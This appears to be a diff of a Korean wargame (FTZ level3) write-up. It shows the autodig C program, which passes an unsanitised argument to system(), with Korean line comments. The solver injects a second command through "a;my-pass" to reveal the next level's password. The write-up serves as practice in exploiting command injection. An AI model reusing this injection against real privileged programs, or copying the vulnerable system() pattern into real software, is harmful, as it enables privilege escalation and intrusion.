@@ -1,7 +1,5 @@
 login as: level3
 level3@192.168.35.100's password:
-Access denied
-level3@192.168.35.100's password:
 [level3@ftz level3]$ ll
 total 12
 -rw-r--r--    1 root     root          543 Nov 26  2000 hint
@@ -20,17 +18,17 @@ int main(int argc, char **argv){
 
     char cmd[100];
 
-    if( argc!=2 ){
+    if( argc!=2 ){		### argc가 2가 아니면 if문 작동
         printf( "Auto Digger Version 0.9\n" );
         printf( "Usage : %s host\n", argv[0] );
         exit(0);
     }
-
-    strcpy( cmd, "dig @" );
-    strcat( cmd, argv[1] );
+###argc가 2일 때 아래 실행
+    strcpy( cmd, "dig @" );	### cmd에 “dig @” 복사
+    strcat( cmd, argv[1] );	### cmd에 argv[1]를 이어붙힌다 
     strcat( cmd, " version.bind chaos txt");
 
-    system( cmd );
+    system( cmd );	### cmd의 값을 실행
 
 }
 
@@ -47,6 +45,9 @@ more hints.
 Auto Digger Version 0.9
 Usage : /bin/autodig host
 [level3@ftz level3]$ /bin/autodig "a;my-pass"
+### 동시에 여러 명령어를 사용하려면 ; 사용
+### ;는 앞의 명령어가 실패해도 다음 명령어 실행
+### 문자열 형태로 명령어를 전달하려면 “” 사용
 dig: Couldn't find server 'a': Name or service not known
 
 Level4 Password is "suck my brain".
